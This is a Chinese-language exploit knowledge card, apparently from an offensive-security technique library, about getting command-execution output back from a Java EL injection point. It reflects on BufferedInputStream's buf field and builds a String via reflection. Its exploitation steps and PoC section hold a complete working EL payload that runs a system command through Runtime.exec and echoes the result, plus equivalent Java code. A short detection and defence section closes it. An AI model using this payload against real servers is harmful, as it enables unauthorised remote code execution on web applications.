---
id: web-java-expression-el-injection-bufferedinputstream-buf-echo
title: EL 表达式注入回显：反射 BufferedInputStream 的 buf 字段 + String(byte[],charset) 构造器，不引入 Scanner/BufferedReader
type: scenario
domain: web
path: web/java/expression
technique: el-injection-bufferedinputstream-buf-reflect-echo
aliases:
- EL 注入回显
- EL InputStream 转 String
- BufferedInputStream.buf 反射
- String(byte[],charset) 构造器
- pageContext 跨标签传变量
- EL 无 new 反射
- 不引入 Scanner 的回显
tags:
- java
- el
- expression-injection
- jsp
- reflection
- bufferedinputstream
- input-stream
- echo
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V401
  verified_at: '2026-11-09T13:09:05+08:00'
  notes: 已对照原文核对：图01-05 确认 EL 无 new/无 .class/必须全类名（Class.forName('Integer') 失败、java.lang.Integer 反射 parseInt 输出 23333333）；图06/07/08 确认单标签多语句返回值与跨标签变量保持（输出 6/620/636）；图09 exec().getInputStream() 存入 pageContext；图13/14 JDK8u191 下实际类为 java.io.BufferedInputStream、buf=byte[8192]、in=FileInputStream；图15/16 available()=count-pos+getInIfOpen().available()、in 定义于 FilterInputStream；图17 buf 为 protected volatile byte[]；图18 调用流程图；图19 完整 EL payload 实测回显 ipconfig 输出，均与卡内原理/PoC/利用步骤一致。路径 web/java/expression 合法；frontmatter 无 sources/source/source_url/文章 ID；原文 JDK 8u191 + Tomcat 8.5.100 + tomcat-jasper 10.1.5 仅为测试环境而非受影响版本，affected_versions 已 --clear。dedup report recommendation=new，top 候选 el-injection-waf-bypass-scanner-echo（0.9276，related）讲方括号/concat WAF 绕过+Scanner 回显，本卡为反射 BufferedInputStream.buf + String(byte[],charset) 的另一条回显链，非同链。未验证点：未在本机复跑 EL payload；ProcessPipeInputStream 等跨平台实现差异卡内已注明边界。dup-scan.json（2026-11-08）早于本卡建卡（2026-11-09），无涉及本卡的 pair。
---

## 一句话结论

JSP EL 注入里没有 `new`、类只能全类名反射；当 Scanner/BufferedReader 等"引入新类"的回显方式被沙箱/WAF 限制时，可以反射取 `Runtime.exec()` 返回的 `BufferedInputStream` 自身 `buf` 字段，调用 `bis.read(buf, 0, bis.available())` 把命令输出读进这块 8192 字节缓冲，再用 `String(byte[], String)` 构造器反射还原成字符串；跨多个 `${}` 标签用 `pageContext.setAttribute/getAttribute` 传递 InputStream 与 Field 对象，并用 `Thread.sleep(500)` 等进程写完，即可在 EL 注入点直接回显命令输出。

## 原理

- **EL 注入的对象获取限制**：
  - 不能 `new`：`${new String("a")}` 抛 `ELException: The identifier [new] is not a valid Java identifier`；
  - 不能用 `.class`：`${java.lang.String.class}` 抛 `The identifier [class] is not a valid Java identifier`；
  - 只能走无需 new 的静态方法或反射，如 `Class.forName("java.lang.Integer").getDeclaredMethod("parseInt", "".getClass()).invoke(null, "23333333")` 返回 23333333；
  - 类名必须是全类名：`Class.forName("Integer")` 抛 `ClassNotFoundException`，`java.lang.Integer` 才行（与 SpEL 可直接 `T(Integer)` 不同）。这就是 EL 注入比 SpEL 更容易受限、回显链更容易被类白名单卡住的原因。
- **EL 语法特性**：
  - 单个 `${}` 内可用分号执行多段代码，返回值是最后一段：`${2*2;Runtime.getRuntime().exec("calc");2*3}` 输出 6；
  - 多个 `${}` 标签可并存，标签内赋值的变量会写入 EL 上下文并由解析器维护：`${a=3;b=2;a*b}${a*a*b*b}` 输出 636；
  - 实际操作中更常用上下文 getter/setter（`pageContext.setAttribute("is", ...)` / `pageContext.getAttribute("is")`）显式保存/取回中间对象，避免依赖解析器对局部变量名的维护差异。
- **为什么 `BufferedInputStream.buf` 里有命令输出**：
  - JDK8u191 实测 `Runtime.getRuntime().exec(cmd).getInputStream()` 返回 `java.io.BufferedInputStream`；
  - `BufferedInputStream` 自身有 `protected volatile byte[] buf`（默认 8192 字节，延迟创建）；其父类 `FilterInputStream` 有 `protected volatile InputStream in`，指向底层进程管道（线程转储里为 `FileInputStream`）；
  - `BufferedInputStream.available()` 的实现是 `count - pos + getInIfOpen().available()`，即缓冲内剩余 + 底层流可读；对刚 exec 完的进程流，`available()` 会给出输出长度；
  - 调试器可直接看到 `bis` 的 `buf = byte[8192]`、`in = FileInputStream@...`，执行结果就在底层流中。
- **回显链**：
  1. `bis.read(bis.buf, 0, bis.available())` 把底层可读数据填进 `buf`（`read(byte[],off,len)` 是 BufferedInputStream 的公开方法，不需要反射）；
  2. `buf` 是 protected 字段，用 `Class.forName("java.io.BufferedInputStream").getDeclaredField("buf")` + `setAccessible(true)` 取出；
  3. `Class.forName("java.lang.String").getDeclaredConstructor(Class.forName("[B"), Class.forName("java.lang.String")).newInstance(buf, "gbk")` 构造字符串——`new String(byte[], charsetName)` 构造器直接接受字节数组与编码。
- **为什么"不引入新类"很重要**：EL 注入的常见回显依赖 `java.util.Scanner` 或 `java.io.BufferedReader`/`InputStreamReader`；如果目标 EL 沙箱/中间件类黑名单只放行了反射链上已有的类（Class、Field、BufferedInputStream、String），新增 Scanner/BufferedReader 可能被拦。本链只用 `java.io.BufferedInputStream`、`java.lang.String`、`java.lang.Class`、`[B` 等已涉及/基础类，兼容性更好。
- **编码与等待**：exec 是异步的，读取前需 `Thread.sleep(500)` 等进程写完；Windows 中文系统命令输出为 GBK，String 构造器用 `"gbk"` 解码避免乱码，且 JSP 需声明 `pageEncoding="UTF-8"` 否则页面二次编码仍会乱码（原文环境：JDK 8u191 + Tomcat 8.5.100 + tomcat-jasper 10.1.5）。

## 触发条件

- 存在 EL 求值入口且结果返回页面，例如 `PageContextImpl.proprietaryEvaluate(request.getParameter("expr"), String.class, pageContext, null)` 或模板中直接拼接用户输入到 `${...}`。
- EL 引擎允许 `Class.forName`、反射与 `setAccessible`（未启用类白名单/沙箱，或可绕过）。
- JDK 8 等没有 `InputStream.readAllBytes()`（JDK9+ 可直接 `readAllBytes()`，链更短）；目标返回 `BufferedInputStream` 或其子类。
- 需要回显页面把 EL 结果输出；无回显时改用写文件/DNS/HTTP 外带。

## 利用步骤

1. 确认 EL 执行：`${3-1}` 返回 2；`${"" .getClass()}` 返回 `class java.lang.String`。
2. 确认对象获取限制：试 `${new String("a")}`、`${java.lang.String.class}`、`Class.forName("Integer")`，确认只能全类名反射。
3. 执行命令并保存流：`${pageContext.setAttribute("is", Runtime.getRuntime().exec("cmd /c ipconfig").getInputStream())}`。
4. 等待进程输出：`${Thread.sleep(500)}`。
5. 取 `buf` 字段并放开访问：`${pageContext.setAttribute("bufField", Class.forName("java.io.BufferedInputStream").getDeclaredField("buf"))}`、`${pageContext.getAttribute("bufField").setAccessible(true)}`。
6. 读入缓冲：`${pageContext.getAttribute("is").read(pageContext.getAttribute("bufField").get(pageContext.getAttribute("is")), 0, pageContext.getAttribute("is").available())}`。
7. 构造字符串回显：`${Class.forName("java.lang.String").getDeclaredConstructor(Class.forName("[B"), Class.forName("java.lang.String")).newInstance(pageContext.getAttribute("bufField").get(pageContext.getAttribute("is")), "gbk")}`。

## PoC

完整 EL payload（原文环境实测，一条请求内用换行分隔多个标签；实际提交时按目标解析方式拼接）：

```text
${pageContext.setAttribute("is",Runtime.getRuntime().exec("cmd /c ipconfig").getInputStream())}
${Thread.sleep(500)}
${pageContext.setAttribute("bufField",Class.forName("java.io.BufferedInputStream").getDeclaredField("buf"))}
${pageContext.getAttribute("bufField").setAccessible(true)}
${pageContext.getAttribute("is").read(pageContext.getAttribute("bufField").get(pageContext.getAttribute("is")),0,pageContext.getAttribute("is").available())}
${Class.forName("java.lang.String").getDeclaredConstructor(Class.forName("[B"),Class.forName("java.lang.String")).newInstance(pageContext.getAttribute("bufField").get(pageContext.getAttribute("is")),"gbk")}
```

Java 等价验证代码（理解链路用）：

```java
BufferedInputStream bis = (BufferedInputStream) Runtime.getRuntime().exec("whoami").getInputStream();
Thread.sleep(500);
Field bufField = Class.forName("java.io.BufferedInputStream").getDeclaredField("buf");
bufField.setAccessible(true);
bis.read((byte[]) bufField.get(bis), 0, bis.available());
String result = (String) Class.forName("java.lang.String")
        .getDeclaredConstructor(Class.forName("[B"), Class.forName("java.lang.String"))
        .newInstance(bufField.get(bis), "gbk");
System.out.println(result);
```

说明：原文在 `el.jsp`（PageContextImpl.proprietaryEvaluate）上实测输出 ipconfig 结果；PoC 未在本机复跑。

## 变体与关联

- 变体（JDK9+）：`InputStream.readAllBytes()` 直接返回 byte[]，无需反射 `buf`，链更短；JDK8 及更早没有该方法。
- 变体（其他转换方式）：`Scanner(InputStream).useDelimiter("\\A").next()`、`BufferedReader(InputStreamReader).readLine()` 循环、Guava `CharStreams`、Apache `IOUtils.toString`、`StreamUtils.copyToString`；这些需要引入新类，在类白名单场景下可能被拦，正是本卡要规避的点。
- 变体（无 pageContext）：`${}` 内变量赋值可跨标签保持（如 `${a=3;b=2;a*b}${a*a*b*b}`），但依赖解析器维护局部变量；也可以用 `request.setAttribute`、`session.setAttribute` 等替代 `pageContext`。
- 关联：[[web-java-expression-el-injection-waf-bypass-scanner-echo]]（EL 注入 WAF 绕过 + Scanner 回显，本卡是 Scanner 被限制时的替代回显链）、[[web-java-expression-spel-no-echo-exfil-streamutils]]（SpEL 下的流读取与外带）、[[web-java-expression-jexl-new-processbuilder-command-exec]]（其他表达式引擎的执行 sink）。
- 边界：EL 引擎禁用反射/setAccessible、类白名单不包含 `[B`/String/Class、或沙箱重写 `Class.forName` 时本链失效；`getInputStream()` 的具体实现类随 JDK/平台不同（可能是 `ProcessPipeInputStream` 子类），但只要是 `BufferedInputStream` 子类，`buf`（BufferedInputStream）与 `in`（FilterInputStream）字段结构不变。

## 检测与防御

- 检测：EL 请求中出现 `pageContext.setAttribute`、`Class.forName`、`getDeclaredField`、`setAccessible`、`BufferedInputStream`、`read(`、`Thread.sleep` 等组合；响应体出现 `java.io.BufferedInputStream@`、`class java.lang.`、命令输出（如 `Windows IP 配置`、`uid=`）；EL 异常栈出现 `ELException`/`ClassNotFoundException`。
- 防御：不要把用户输入拼进 EL；必须求值时使用 `SimpleEvaluationContext`/显式白名单变量，禁用类型引用、`Class.forName`、反射与 `setAccessible`；升级 EL 实现并启用类白名单/沙箱。
- 加固：WAF 语法级检测 `${` 表达式与反射关键字；求值接口做认证、限流、长度限制；应用层禁止 `PageContextImpl.proprietaryEvaluate` 处理外部输入。
